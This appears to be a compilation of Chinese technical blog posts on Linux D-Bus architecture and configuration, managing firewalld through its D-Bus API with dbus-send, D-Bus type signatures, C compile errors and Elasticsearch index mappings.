7大基础IPC的是，D-Bus是在这些IPC类型之上实现的中间件IPC，D-Bus使用了基础IPC中一种过多种，其设计的目的是在Linux桌面环境，提供服务的标准化。但目前并没有合入主线内核中。\n作为中间件IPC，D-Bus的性能较低与其他IPC模式，因为在通信过程中会进行很多上下文切换，如果通过Dbus来发送消息，会先将其发送到内核，然后将其送回D-Bus。AF_BUS 补丁是新的套接字类型，用来减少D-Bus上下文的切换。\n更多可参考：https://en.wikipedia.org/wiki/D-Bus\nD-Bus组成 D-Bus是 一个IPC的实现方式，在架构上分位三层。\nLayer 1 libdbus：freedesktop机构提供的一个免费开源的一个由C语言编写的 low-level API 。是提供dbus功能的库。是高级API绑定的低级API。 Layer 2 dbus daemon：dbus实现的IPC守护进行，随Linux启动，通过不通进程对其的连接，实现了多进程间消息的路由（包含内核、网络、桌面等） Layer 3 Wapper libraries （high-level API）： 对 low-level API libdbus的封装 ，例如 libdbus-qt libdbus-python github.com/godbus/dbus，这些不同编程语言实现的Wapper是不同开发者应该使用的lib，其简化了D-Bus的开发难度。 Reference\ndbus-tutorial\ndbus 基本概念 总线 在 D-Bus 中，bus是一个核心概念。它是应用程序可以进行方法调用、发送信号和侦听信号的通道。有两种预定义的bus：会话总线和系统总线。\n会话总线（Session Bus）：普通进程创建，可同时存在多条。会话总线属于某个进程私有，它用于进程间传递消息。\n系统总线（System Bus）：在引导时就会启动，它由操作系统和后台进程使用，安全性非常好，以使得任意的应用程序不能欺骗系统事件。当然，如果一个应用程序需要接受来自系统总线的消息，他也可以直接连接到系统总线中，但是他能发送的消息是受限的。系统总线最常见的用途是在系统范围事件发生时发送系统范围的通知。添加新的存储设备、网络连接更改事件和关闭相关事件都是系统总线何时更适合通信总线的示例。\n通常情况下只存在一个System Bus，但可以存在多个Session Bus（每个桌面会话一个）。\n总线以dbus-daemon的形式存在与系统中，该进程专门将消息从一个进程传递到另一个进程。该守护进程还将向总线上的所有应用程序转发通知。\nbus name 总线名称 Bus Name，不能单单以字面意思 总线名称 来理解，官方对其解释为**：Connections have one or more bus names associated with them. A connection has exactly one bus name that is a unique connection name.**，可以出bus name其实是用来连接名称。主要是用来标识一个应用和消息总线的连接。总线名称主要分为两类：唯一名称与公共名称。\n唯一连接名称 unique connection names ：以冒号（\u0026rsquo;：\u0026rsquo;）字符开头的 bus name是唯一的连接名称。例如 :1.0。每个连接都有一个唯一名。在一个 消息总线的生命期内，不会有两个连接有相同的唯一名。 公共连接名称 well-known bus names：公共名称是以反向DNS域名（小写）例如：org.fedoraproject.FirewallD1。 如果DNS 域名包含连字符/减号，则应将其替换为下划线，如果包含数字，则应通过添加下划线进行转义。例如： 7-zip.org的bus name应该定义为 org._7_zip.Archiver。 Reference\nbus name\n对象路径 对象路径(Object Paths) 是用于引用对象实例的名称（类似于 C++ 或 Java 对象）。从概念上来说，D-Bus在消息交换中每个参与者都有任意个对象实例，如文件系统一样，Dbus中的参与者中的对象实例也会形成一个层次树。如，在CentOS7中 firewalld开发的D-Bus API 使用了/org/fedoraproject/FirewallD1的层次结构。\n在定义一个对象路径时，需要注意以下：\n路径可以是任意长度 路径必须以 ASCII \u0026lsquo;/\u0026rsquo;（整数 47）字符开头，并且必须由以斜杠字符分隔的元素组成。 每个元素只能包含 ASCII 字符 [AZ][az][0-9]_ 不允许出现 空字符串 多个 / 字符不能依次出现。 除非路径是根路径（单个/字符），否则不允许尾随 /字符。 接口名称 interface，在每个 Object Path都包含多个接口，一般情况下接口名称应以==反向 DNS 域名开头==（小写），（同 Java 中的接口名称）。在命名规则上，与bus name相同。\n例如：CentOS7中 firewalld开发的D-Bus API 定义的管理zone的接口 org.fedoraproject.FirewallD1.config.zone。如果DNS名称中包含-，则应将其替换为下划线 _。如果DNS 域名包含紧跟在 . 之后的数字，则接口名称应在数字之前添加一个下划线。例如，如果 7-zip.org 插件定义了一个接口，应该被命名为org._7_zip.Plugin.\n成员方法名称 成员方法名称，Member names ,对于定义了接口后，需要实现其接口的放法，如需要获得firewalld的zone时，就可以调用 org.fedoraproject.FirewallD1.getDefaultZone 。在D-Bus中Member names通常由“驼峰式”（camel-case）命名 。\ndbus 在Linux中，如CentOS dbus包括 dbus daemon及一些cli commad。这些包dbuslib\nD-Bus的消息 最基本的D-Bus协议是一对一的通信协议。与直接使用socket不同，D-Bus是面向消息的协议。 D-Bus的所有功能都是通过在连接上流动的消息完成的。\n而在D-Bus中有四种类型的消息\nMETHOD_CALL 方法调用 METHOD_RETURN 方法返回 ERROR 错误 SIGNAL 信号：与方法调用不同，信号发射没有响应。信号发射只是一个类型为 SIGNAL 的消息。它必须具有三个标头字段：PATH给出发出信号的对象，加上INTERFACE并MEMBER给出信号的完全限定名称。 消息返回的类型\nConventional name 十进制值 说明 INVALID 0 这是个无效类型 METHOD_CALL 1 方法调用，该方法会有提示 METHOD_RETURN 2 方法返回的数据 ERROR 3 错误返回，第一个是其错误的信息 SIGNAL 4 信号的发射 CentOS的dbus服务管理 在CentOS7中，作为systemd的一部分D-BUS会从Systemd获取套接字文件描述符，并使用D-Bus交换当前进程生成的socket信息。而PID 1 不使用 PolicyKit 来控制对特权操作的访问，而是完全依赖于 low-level API D-Bus 。（这样做是为了避免 PolicyKit 和 systemd/PID 1 之间的循环依赖。）而有些特权进程（例如关机/重启/挂起/登陆）可以通过logind进行管理的。\n由此，可以知道在CentOS中，dbus相关的服务大概有 dbus,与 logind。\ndbus包含：\ndbus-daemon：dbus架构中 layer 2的 dbus-damon\ndbus-send: dbus提供的命令行工具，可以用dbus-send来发送消息。\ndbus-monitor: dbus提供的命令行工具，用于监视总线上流动的消息。\ndbus-launch： shell脚本启动消息总线的命令行工具\ndbus配置文件说明 dbus-daemon守护进程，有两个配置文件，一个为 session bus，另外一个为 system bus。\n标准的system bus文件 /usr/local/share/dbus-1/system.conf session bus配置 /usr/local/share/dbus-1/session.conf中配置。在一般情况下，不会操作这两个文件，因其会引入 /etc/dbus-1 中的system.conf 或 session.conf。\n配置文件包含的标签：\n更多的注释可以参考：dbus-daemon\n# 根元素\r\u0026lt;busconfig\u0026gt;\r\u0026lt;!-- 根据指定的 -system或 -session 来选择的配置文件 --\u0026gt;\r\u0026lt;type\u0026gt;system\u0026lt;/type\u0026gt;\r\u0026lt;!-- dbus-daemon运行的用户 --\u0026gt;\r\u0026lt;user\u0026gt;dbus\u0026lt;/user\u0026gt;\r\u0026lt;!-- Fork into daemon mode --\u0026gt;\r\u0026lt;fork/\u0026gt;\r\u0026lt;!-- We use system service launching using a helper --\u0026gt;\r\u0026lt;standard_system_servicedirs/\u0026gt;\r\u0026lt;!-- This is a setuid helper that is used to launch system services --\u0026gt;\r\u0026lt;servicehelper\u0026gt;//usr/libexec/dbus-1/dbus-daemon-launch-helper\u0026lt;/servicehelper\u0026gt;\r\u0026lt;!-- Write a pid file --\u0026gt;\r\u0026lt;pidfile\u0026gt;/run/dbus/messagebus.pid\u0026lt;/pidfile\u0026gt;\r\u0026lt;!-- Enable logging to syslog --\u0026gt;\r\u0026lt;syslog/\u0026gt;\r\u0026lt;!-- 指定授权机制。如果不存在，所有的机制都被允许。 --\u0026gt;\r\u0026lt;auth\u0026gt;EXTERNAL\u0026lt;/auth\u0026gt;\r\u0026lt;!-- 总线监听的地址，支持unix socket，tcp，system等\r--\u0026gt;\r\u0026lt;listen\u0026gt;unix:path=/run/dbus/system_bus_socket\u0026lt;/listen\u0026gt;\r\u0026lt;listen\u0026gt;unix:path=/tmp/foo\u0026lt;/listen\u0026gt;\r\u0026lt;listen\u0026gt;tcp:host=localhost,port=1234\u0026lt;/listen\u0026gt; \u0026lt;policy context=\u0026quot;default\u0026quot;\u0026gt;\r\u0026lt;!-- All users can connect to system bus --\u0026gt;\r\u0026lt;allow user=\u0026quot;*\u0026quot;/\u0026gt;\r\u0026lt;!-- Holes must be punched in service configuration files for\rname ownership and sending method calls --\u0026gt;\r\u0026lt;deny own=\u0026quot;*\u0026quot;/\u0026gt;\r\u0026lt;deny send_type=\u0026quot;method_call\u0026quot;/\u0026gt;\r\u0026lt;!-- Signals and reply messages (method returns, errors) are allowed\rby efault --\u0026gt;\r\u0026lt;allow send_type=\u0026quot;signal\u0026quot;/\u0026gt;\r\u0026lt;allow send_requested_reply=\u0026quot;true\u0026quot; send_type=\u0026quot;method_return\u0026quot;/\u0026gt;\r\u0026lt;allow send_requested_reply=\u0026quot;true\u0026quot; send_type=\u0026quot;error\u0026quot;/\u0026gt;\r\u0026lt;!-- All messages may be received by default --\u0026gt;\r\u0026lt;allow receive_type=\u0026quot;method_call\u0026quot;/\u0026gt;\r\u0026lt;allow receive_type=\u0026quot;method_return\u0026quot;/\u0026gt;\r\u0026lt;allow receive_type=\u0026quot;error\u0026quot;/\u0026gt;\r\u0026lt;allow receive_type=\u0026quot;signal\u0026quot;/\u0026gt;\r\u0026lt;!-- Allow anyone to talk to the message bus --\u0026gt;\r\u0026lt;allow send_destination=\u0026quot;org.freedesktop.DBus\u0026quot;\rsend_interface=\u0026quot;org.freedesktop.DBus\u0026quot; /\u0026gt;\r\u0026lt;allow send_destination=\u0026quot;org.fedoraproject.FirewallD1\u0026quot; send_interface=\u0026quot;org.fedorapproject.FirewallD1\u0026quot; /\u0026gt;\r\u0026lt;allow send_destination=\u0026quot;org.freedesktop.DBus\u0026quot;\rsend_interface=\u0026quot;org.freedesktop.DBus.Introspectable\u0026quot;/\u0026gt;\r\u0026lt;!-- But disallow some specific bus services --\u0026gt;\r\u0026lt;deny send_destination=\u0026quot;org.freedesktop.DBus\u0026quot;\rsend_interface=\u0026quot;org.freedesktop.DBus\u0026quot;\rsend_member=\u0026quot;UpdateActivationEnvironment\u0026quot;/\u0026gt;\r\u0026lt;deny send_destination=\u0026quot;org.freedesktop.DBus\u0026quot;\rsend_interface=\u0026quot;org.freedesktop.DBus.Debug.Stats\u0026quot;/\u0026gt;\r\u0026lt;deny send_destination=\u0026quot;org.freedesktop.DBus\u0026quot;\rsend_interface=\u0026quot;org.freedesktop.systemd1.Activator\u0026quot;/\u0026gt;\r\u0026lt;/policy\u0026gt;\r\u0026lt;!-- Only systemd, which runs as root, may report activation failures. --\u0026gt;\r\u0026lt;policy user=\u0026quot;root\u0026quot;\u0026gt;\r\u0026lt;allow send_destination=\u0026quot;org.freedesktop.DBus\u0026quot;\rsend_interface=\u0026quot;org.freedesktop.systemd1.Activator\u0026quot;/\u0026gt;\r\u0026lt;/policy\u0026gt;\r\u0026lt;!-- root may monitor the system bus. --\u0026gt;\r\u0026lt;policy user=\u0026quot;root\u0026quot;\u0026gt;\r\u0026lt;allow send_destination=\u0026quot;org.freedesktop.DBus\u0026quot;\rsend_interface=\u0026quot;org.freedesktop.DBus.Monitoring\u0026quot;/\u0026gt;\r\u0026lt;/policy\u0026gt;\r\u0026lt;!-- If the Stats interface was enabled at compile-time, root may use it.\rCopy this into system.local.conf or system.d/*.conf if you want to\renable other privileged users to view statistics and debug info --\u0026gt;\r\u0026lt;policy user=\u0026quot;root\u0026quot;\u0026gt;\r\u0026lt;allow send_destination=\u0026quot;org.freedesktop.DBus\u0026quot;\rsend_interface=\u0026quot;org.freedesktop.DBus.Debug.Stats\u0026quot;/\u0026gt;\r\u0026lt;/policy\u0026gt;\r\u0026lt;!-- Include legacy configuration location --\u0026gt;\r\u0026lt;include ignore_missing=\u0026quot;yes\u0026quot;\u0026gt;/etc/dbus-1/system.conf\u0026lt;/include\u0026gt;\r\u0026lt;!-- 包含的子配置文件. --\u0026gt;\r\u0026lt;includedir\u0026gt;system.d\u0026lt;/includedir\u0026gt;\r\u0026lt;includedir\u0026gt;/etc/dbus-1/system.d\u0026lt;/includedir\u0026gt;\r\u0026lt;!-- This is included last so local configuration can override what's in this standard file --\u0026gt;\r\u0026lt;include ignore_missing=\u0026quot;yes\u0026quot;\u0026gt;/etc/dbus-1/system-local.conf\u0026lt;/include\u0026gt;\r\u0026lt;include if_selinux_enabled=\u0026quot;yes\u0026quot; selinux_root_relative=\u0026quot;yes\u0026quot;\u0026gt;contexts/dbus_contexts\u0026lt;/include\u0026gt;\r\u0026lt;/busconfig\u0026gt;\r通过命令行发送dbus消息 dbus支持通过命令发送一个dbus消息，如获取可用的dbus 服务。\ndbus-send --session \\\r--dest=org.freedesktop.DBus \\\r--type=method_call \\\r--print-reply \\\r/org/freedesktop/DBus \\\rorg.freedesktop.DBus.ListNames\rmethod return time=1631452206.288425 sender=org.freedesktop.DBus -\u0026gt; destination=:1.29 serial=3 reply_serial=2\rarray [\rstring \u0026quot;org.freedesktop.DBus\u0026quot;\rstring \u0026quot;org.freedesktop.login1\u0026quot;\rstring \u0026quot;org.freedesktop.systemd1\u0026quot;\rstring \u0026quot;org.fedoraproject.FirewallD1\u0026quot;\rstring \u0026quot;org.freedesktop.PolicyKit1\u0026quot;\rstring \u0026quot;:1.17\u0026quot;\rstring \u0026quot;:1.0\u0026quot;\rstring \u0026quot;:1.29\u0026quot;\rstring \u0026quot;:1.18\u0026quot;\rstring \u0026quot;:1.1\u0026quot;\r]\r返回org.freedesktop.DBus service\ndbus-send --session \\\r--dest=org.freedesktop.DBus \\\r--type=method_call \\\r--print-reply \\\r/org/freedesktop/DBus \\\rorg.freedesktop.DBus.Introspectable.Introspect\r使用dbus api操作linux防火墙 Firewalld是一个基于动态区域的防火墙守护进程，自 2009 年左右开始开发，目前为Fedora 18 以及随后的 RHEL7 和 CentOS 7 中的默认防火墙机制。\nFirewalld被配置为systemd D-Bus 服务。请注意下面的“Type=dbus”指令。\n$ cat /usr/lib/systemd/system/firewalld.service [Unit]\rDescription=firewalld - dynamic firewall daemon\rBefore=network.target\rBefore=libvirtd.service\rBefore=NetworkManager.service\rConflicts=iptables.service ip6tables.service ebtables.service\r[Service]\rEnvironmentFile=-/etc/sysconfig/firewalld\rExecStart=/usr/sbin/firewalld --nofork --nopid $FIREWALLD_ARGS\rExecReload=/bin/kill -HUP $MAINPID\r# supress to log debug and error output also to /var/log/messages\rStandardOutput=null\rStandardError=null\rType=dbus\rBusName=org.fedoraproject.FirewallD1\r[Install]\rWantedBy=basic.target\rAlias=dbus-org.fedoraproject.FirewallD1.service\r知道了firewalld服务是基于D-Bus的，就可以通过D-Bus来操作防火墙。\n查看dbus注册的服务是否包含firewalld，这里需要注意的是，firewalld依赖dbus服务，每次启动firewalld时注册到dbus总线内。所以需要先启动dbus-daemon与 firewalld 服务。\ndbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply \\\r/org/freedesktop/DBus org.freedesktop.DBus.ListNames | grep FirewallD\r查看得知 org.fedoraproject.FirewallD1 为firewalld接口\n查看接口所拥有的方法、属性、信号等信息\ndbus-send --system --dest=org.fedoraproject.FirewallD1 --print-reply \\\r/org/fedoraproject/FirewallD1 org.freedesktop.DBus.Introspectable.Introspect\r获得zone\nfirewall-cmd --get-zones\rdbus-send --system \\\r--dest=org.fedoraproject.FirewallD1 \\\r--print-reply \\\r--type=method_call /org/fedoraproject/FirewallD1 \\\rorg.fedoraproject.FirewallD1.zone.getZones\r查看zone内的条目信息\n$ firewall-cmd --zone=public --list-all\rdbus-send --system --dest=org.fedoraproject.FirewallD1 --print-reply --type=method_call \\\r/org/fedoraproject/FirewallD1 org.fedoraproject.FirewallD1.getZoneSettings string:\u0026quot;public\u0026quot;\r","permalink":"https://www.oomkill.com/2021/11/what-is-dbus/","summary":"","title":"Linux高级IPC - DBus"},{"content":"firewalld，一个基于动态区的iptables/nftables守护程序，自2009年左右开始开发，CentOS7基于 firewalld-0.6.3 ， 发布于2018年10月11日。主要的开发人员是托马斯·沃纳，他目前为红帽公司工作。这是因为为Federal 18 的默认防火墙机制， 随后在 Rhel7 和 Centos 7 中使用。\nfirewalld比旧的 iptable 机制有许多优势。值得注意的是，它解决了 iptable 要求每次更改时重新启动防火墙的问题，从而中断了任何状态连接。它还提供了丰富的 D-Bus 方法、信号和属性。\n这里并不是从firewalld操作使用方式来介绍firewalld的改名，想反，是介绍firewalld D-Bus API来检索信息或更改设置。\nfirewalld被配置为系统 D-Bus 服务，注意看 systemd file中的\u0026quot; Type=dbus \u0026ldquo;参数。\n$ cat /usr/lib/systemd/system/firewalld.service\r[Unit]\rDescription=firewalld - dynamic firewall daemon\rBefore=network-pre.target\rWants=network-pre.target\rAfter=dbus.service\rAfter=polkit.service\rConflicts=iptables.service ip6tables.service ebtables.service ipset.service\rDocumentation=man:firewalld(1)\r[Service]\rEnvironmentFile=-/etc/sysconfig/firewalld\rExecStart=/usr/sbin/firewalld --nofork --nopid $FIREWALLD_ARGS\rExecReload=/bin/kill -HUP $MAINPID\r# supress to log debug and error output also to /var/log/messages\rStandardOutput=null\rStandardError=null\rType=dbus\rBusName=org.fedoraproject.FirewallD1\rKillMode=mixed\r[Install]\rWantedBy=multi-user.target\rAlias=dbus-org.fedoraproject.FirewallD1.service\r实际上，手动运行 /usr/bin/python2 -Es /usr/sbin/firewalld --nofork --nopid --debug 效果是一样的，这里的注册是通过dbus 高级API操作的。\n此时由于已经了解到了，firewalld 服务 是基于D-Bus接口的，所以需要找到对应的 dbus interface\ndbus-send --system --dest=org.freedesktop.DBus \\\r--type=method_call --print-reply \\\r/org/freedesktop/DBus org.freedesktop.DBus.ListNames | grep FirewallD\rorg.fedoraproject.FirewallD1 这个就是firewalld注册的dbus interface了。\ndbus-send 命令可以向 D-Bus消息总线发送消息并显示该消息的返回结果。有两个众所周知的消息总线：system bus（Option -System） 和每个用户session bus（ -session）。使用 firewall-cmd 也是通过 dbus interface 进行交互的。在使用dbus-send 时，必须指定其对应的消息接口 -dest，该参数是连接到对应总线上的接口名称，以将消息发送到对应的dbus firewalld-server进行对应iptables规则的翻译。\n现在有了dbus接口，需要了解改接口支持的方法 methods，属性 properties ，信号signals 等信息。\ndbus-send --system --dest=org.fedoraproject.FirewallD1 --print-reply \\\r/org/fedoraproject/FirewallD1 \\\rorg.freedesktop.DBus.Introspectable.Introspect\r通过上述输出列出了通过防火墙 D-Bus 接口提供的所有方法、单一和属性。这是基于D-Bus DTD 的输出格式。所有 dbus服务都需要实现 org.freedesktop.DBus.Introspectable.Introspect 方法。\n知道了 方法 属性 信号，就可以直接对firewalld进行一个操作了。现在开始第一个例子。获取默认zone。\n$ firewall-cmd --get-default-zone\rdbus-send --system --dest=org.fedoraproject.FirewallD1 \\\r--print-reply --type=method_call \\ /org/fedoraproject/FirewallD1 \\\rorg.fedoraproject.FirewallD1.getDefaultZone\r通过dbus接口来检索区域列表\n$ firewall-cmd --get-zones\rdbus-send --system \\\r--dest=org.fedoraproject.FirewallD1 \\\r--print-reply --type=method_call \\ /org/fedoraproject/FirewallD1 \\\rorg.fedoraproject.FirewallD1.zone.getZones\r最常用的命令：查看当前zone所有策略\n$ firewall-cmd --zone=public --list-all\rdbus-send --system \\\r--dest=org.fedoraproject.FirewallD1 \\\r--print-reply --type=method_call \\\r/org/fedoraproject/FirewallD1 \\\rorg.fedoraproject.FirewallD1.getZoneSettings string:\u0026quot;public\u0026quot;\r获得inerface的properties\n其实这里在命令行根本用不到，但是在封装时却会可以用到。\ndbus-send --system \\\r--print-reply --dest=org.fedoraproject.FirewallD1 \\\r/org/fedoraproject/FirewallD1 \\\rorg.freedesktop.DBus.Properties.GetAll string:\u0026quot;org.fedoraproject.FirewallD1\u0026quot;\r还可以通过其他的接口来查看对应的属性值\ndbus-send --system --print-reply --dest=org.fedoraproject.FirewallD1 \\\r/org/fedoraproject/FirewallD1 \\\rorg.freedesktop.DBus.Properties.Get \\\rstring:\u0026quot;org.fedoraproject.FirewallD1\u0026quot; \\\rstring:\u0026quot;version\u0026quot;\r$ dbus-send --system --print-reply \\\r--dest=org.fedoraproject.FirewallD1 \\\r/org/fedoraproject/FirewallD1 org.freedesktop.DBus.Properties.Get \\\rstring:\u0026quot;org.fedoraproject.FirewallD1\u0026quot; \\\rstring:\u0026quot;interface_version\u0026quot;\r$ dbus-send --system --print-reply \\\r--dest=org.fedoraproject.FirewallD1 \\\r/org/fedoraproject/FirewallD1 \\\rorg.freedesktop.DBus.Properties.Get \\\rstring:\u0026quot;org.fedoraproject.FirewallD1\u0026quot; \\\rstring:\u0026quot;state\u0026quot;\r$ dbus-send --system --print-reply=literal \\\r--dest=org.fedoraproject.FirewallD1 \\\r/org/fedoraproject/FirewallD1 \\\rorg.freedesktop.DBus.Properties.Get \\\rstring:\u0026quot;org.fedoraproject.FirewallD1\u0026quot; \\\rstring:\u0026quot;state\u0026quot;\r查询规则 查询接口\ndbus-send --system \\\r--dest=org.fedoraproject.FirewallD1 \\\r--print-reply \\\r--type=method_call \\\r/org/fedoraproject/FirewallD1 \\\rorg.fedoraproject.FirewallD1.zone.getZoneOfInterface \\\rstring:\u0026quot;eth0\u0026quot;\r创建一个新zone\ndbus-send --session \\\r--dest=org.freedesktop.DBus \\\r--type=method_call \\\r--print-reply /org/freedesktop/DBus \\\rorg.fedoraproject.FirewallD1.config.addZone \\\rstring:\u0026quot;testapi\u0026quot;\r获得一个zone的所有规则（zonesettings）\ndbus-send --system \\\r--dest=org.fedoraproject.FirewallD1 \\\r--type=method_call \\\r--print-reply /org/fedoraproject/FirewallD1 \\\rorg.fedoraproject.FirewallD1.getZoneSettings \\\rstring:\u0026quot;public\u0026quot;\r添加一个port\ndbus-send --system \\\r--dest=org.fedoraproject.FirewallD1 \\\r--print-reply --type=method_call \\\r/org/fedoraproject/FirewallD1 \\\rorg.fedoraproject.FirewallD1.zone.addPort \\\rstring:\u0026quot;public\u0026quot; \\\rstring:\u0026quot;81\u0026quot; \\\rstring:\u0026quot;tcp\u0026quot; \\\ruint64:300 对应设置firewalld 面板所有属性的命令\nfirewall-cmd --zone=public --change-interface=eth0\rfirewall-cmd --zone=public --add-masquerade\rfirewall-cmd --zone=public --add-forward-port=port=1122:proto=tcp:toport=22:toaddr=192.168.100.3\rfirewall-cmd --zone=public --add-forward-port=port=1122:proto=tcp:toport=22:toaddr=10.0.0.3\rfirewall-cmd --add-protocol=tcp\rfirewall-cmd --add-protocol=udp\rfirewall-cmd --add-icmp-blocks=icmp\rfirewall-cmd --set-target=DROP\rfirewall-cmd --add-icmp-block=redirect\rfirewall-cmd --add-icmp-block=network-unknown\rfirewall-cmd --add-source-port=80/tcp\rfirewall-cmd --add-source-port=100/tcp\rfirewall-cmd --add-source=10.0.0.1\rfirewall-cmd --add-source=10.0.0.2\rfirewall-cmd --add-rich-rule='rule family=ipv4 source address=192.168.1.101/32 service name=telnet limit value=1/m accept'\rfirewall-cmd --add-icmp-block-inversion\rfirewall-cmd --new-zone=123 --permanen\r执行远程命令 dbus接口支持远程命令的，通过dbus-send发送时，根据配置dbus的监听来完成远程的操作\nDBUS_SESSION_BUS_ADDRESS=tcp:host=10.0.0.3,port=55557 根据上述，参考加上官方文档，了解如何通过D-Bus接口操作FirewallD，虽然此处是使用了 dbus-send，但是也可以通过 qt 或者 其他的来管理 基于 dbus api的应用了。\n","permalink":"https://www.oomkill.com/2021/11/firewalld-dbus-interface/","summary":"","title":"使用firewalld dbus接口配置iptables"},{"content":"DBus中也是类似于静态语言，使用了“强类型”数据格式。在DBus上传递的所有数据都需要声明其对应的类型，下面整理了下，DBus中的数据类型，以及在DBus中声明的数据类型是什么意思。\ndbus类型 说明 s string 字符串类型，可以声明 s: a array 数组，可以声明为 a: v variant，variant:: () 结构体，声明时为双括号中间的为类型，可以是多个，例如(ss) 即这个结构体内包含两个字符串属性 b 布尔值 SIGNATURE signature类型 y BYTE d DOUBLE t UINT64 x INT64 u UINT32 i INT32 q uint16 n INT16 {} 词典，这里声明为两个括号，中间为其对应的 key value，例如 {sv} 即 key是字符串类型，value是variant类型。 o OBJECT_PATH 对象路径 a{sv} : 是一个数组，为 一个键值对的词典，里面仅有一个\n(ssssa{ss}as） 为一个结构体， 里面属性有7个 两个词典（数组），五个字符串类型\n(sssbsasa(ss)asba(ssss)asasasasa(ss)b) 这个类型拆开为下：共16个属性\n(\rs string\rs string\rs string\rb bool\rs string\ras array only one string\ra(ss) two string type in the array\ras array only one string\rb bool\ra(ssss) four string type in the array\ras array only one string\ras array only one string\ras array only one string\ras array only one string\ra(ss) two string type in the array\rb bool\r)\r对上述类型，python中就可以很灵活的声明\n[\u0026quot;\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;\u0026quot;, False, DEFAULT_ZONE_TARGET, [], [],\r[], False, [], [], [], [], [], [], False]\rgo 中就需要按照对应类型声明为不通的结构体，属性名称可以不为主，顺序需要一致。\n其dbus收到的报文内容为\nstruct {\rstring \u0026quot;\u0026quot;\rstring \u0026quot;Public\u0026quot; string \u0026quot;For use in public areas. You do not trust the other computers on networks to not harm your computer. Only selected incoming connections are accepted.\u0026quot;\rboolean false\rstring \u0026quot;default\u0026quot;\rarray [\rstring \u0026quot;ssh\u0026quot;\rstring \u0026quot;dhcpv6-client\u0026quot;\r]\rarray [\rstruct {\rstring \u0026quot;55555-55557\u0026quot;\rstring \u0026quot;tcp\u0026quot;\r}\r]\rarray [\rstring \u0026quot;redirect\u0026quot;\rstring \u0026quot;network-unknown\u0026quot;\r]\rboolean true\rarray [\rstruct {\rstring \u0026quot;1122\u0026quot;\rstring \u0026quot;tcp\u0026quot;\rstring \u0026quot;22\u0026quot;\rstring \u0026quot;10.0.0.3\u0026quot;\r}\r]\rarray [\rstring \u0026quot;eth0\u0026quot;\r]\rarray [\rstring \u0026quot;10.0.0.1\u0026quot;\rstring \u0026quot;10.0.0.2\u0026quot;\r]\rarray [\rstring \u0026quot;rule family=\u0026quot;ipv4\u0026quot; source address=\u0026quot;192.168.1.101/32\u0026quot; service name=\u0026quot;telnet\u0026quot; accept limit value=\u0026quot;1/m\u0026quot;\u0026quot;\r]\rarray [\rstring \u0026quot;tcp\u0026quot;\rstring \u0026quot;udp\u0026quot;\r]\rarray [\rstruct {\rstring \u0026quot;80\u0026quot;\rstring \u0026quot;tcp\u0026quot;\r}\rstruct {\rstring \u0026quot;100\u0026quot;\rstring \u0026quot;tcp\u0026quot;\r}\r]\rboolean false\r}\rao: array，里面元素仅为一个object_path\ngolang 中声明一个 Variant 在go中看到variant类型如下\ntype Variant struct {\rsig Signature\rvalue interface{}\r}\r可以通过 SignatureOf(\u0026quot;short\u0026quot;)声明一个 Signature\n然后在通过：MakeVariantWithSignature(v interface{}, s Signature) Variant 声明 对应的 Variant\n注：其他数据类型与golang自己的数据类型一致，数组可以使用slice（类似php，python直接用数组替代即可更灵活）\nMore Reference dbus data type\ndbus data type conparision perl\n","permalink":"https://www.oomkill.com/2021/11/dbus-data-structure/","summary":"","title":"通俗易懂的dbus数据结构"},{"content":" Question1: Similar to pause command in linux\nread -n 1 Question2 read : Illegal option -n\n原因为ubuntu 默认的是dash 不是 bash Reference\nQuestion3: How to Compile C programing Language\ngcc hello.c -o hello Question4: Segmentation fault (core dumped)\n编译正常执行错误，在linux中使用 strace 查看具体报错。\nReference\n","permalink":"https://www.oomkill.com/2021/11/c-complie-record/","summary":"","title":"C程序编译错误记录"},{"content":"索引管理 创建索引 直接创建索引 PUT newindex1，创建索引可以通过 number_of_shares 和 number_of_replicas 数量来修饰分片和副本的数量。\nPUT newindex\r{\r\u0026quot;settings\u0026quot;: {\r\u0026quot;index\u0026quot; : {\r\u0026quot;number_of_shares\u0026quot; : 2,\r\u0026quot;number_of_replicas\u0026quot;: 1\r}\r}\r}\rnumber_of_shares 分片数在创建索引后不能修改\nnumber_of_replicas 副本数可以随时完成修改\n删除索引 DEL index_name\n打开/关闭索引 POST {index_name}/_close\nPOST {index_name}/_open\n关闭的索引无法进行【增删改查】操作\n{\r\u0026quot;error\u0026quot; : {\r\u0026quot;root_cause\u0026quot; : [\r{\r\u0026quot;type\u0026quot; : \u0026quot;index_closed_exception\u0026quot;,\r\u0026quot;reason\u0026quot; : \u0026quot;closed\u0026quot;,\r\u0026quot;index_uuid\u0026quot; : \u0026quot;3eCslZZ3Q9amlUyDtqTXWA\u0026quot;,\r\u0026quot;index\u0026quot; : \u0026quot;newindex\u0026quot;\r}\r],\r\u0026quot;type\u0026quot; : \u0026quot;index_closed_exception\u0026quot;,\r\u0026quot;reason\u0026quot; : \u0026quot;closed\u0026quot;,\r\u0026quot;index_uuid\u0026quot; : \u0026quot;3eCslZZ3Q9amlUyDtqTXWA\u0026quot;,\r\u0026quot;index\u0026quot; : \u0026quot;newindex\u0026quot;\r},\r\u0026quot;status\u0026quot; : 400\r}\r索引的映射 mapping mapping是定义文档及包含字段的存储与索引方式。可以理解为是elasticsearch的表结构，定义mapping，即在创建index时，自行判断每个字段的类型，而不是有ES自动自动判断每个纬度的类型。这种更贴合业务场景，如分词、存储。\n每个索引仅有一个映射类型（elasticsearch6.x+，之前版本一个索引下有多个类型），它决定了文档将如何被索引。而映射类型分为两部分 meta-fields 与 field of properties\nmeta-fields ：为文档的源数据，如 _index （索引的名称）、_type （文档的类型，7.0+弃用）、_id （索引的ID）和 _source（用于关联文档源数据）字段\nfield of properties：字段属性，包含文档的字段或属性列表。\n字段的数据类型 常见类型 binary：二进制或Base64字符串。 boolean: 布尔值true和false。 keywords：keyword, constant_keyword, 和 wildcard. Numbers：数值类型，例如long和double dates：日期类型，date 和 date_nanos。 alias： 为以有字段定义别名。 对象嵌套类型 object ：JSON对象。 flattened：整个JSON对象作为单个字段值。 nested：嵌套，与子字段之间保留关系的json对象。 join：为同一索引中的文档定义父/子关系。 结构化类型 range：，long_range，double_range， date_range，和ip_range。 ip：IPv4和IPv6地址。 version ：软件版本号。支持 语义化版本号 优先规则。 murmur3：计算并存储值的散列。 汇总数据类型 aggregate_metric_double：预汇总的指标值。 histogram：以直方图形式预汇总的数值。 文字搜寻类型 text：分析的非结构化文本。 annotated-text：包含特殊标记的文本。用于标识命名实体。 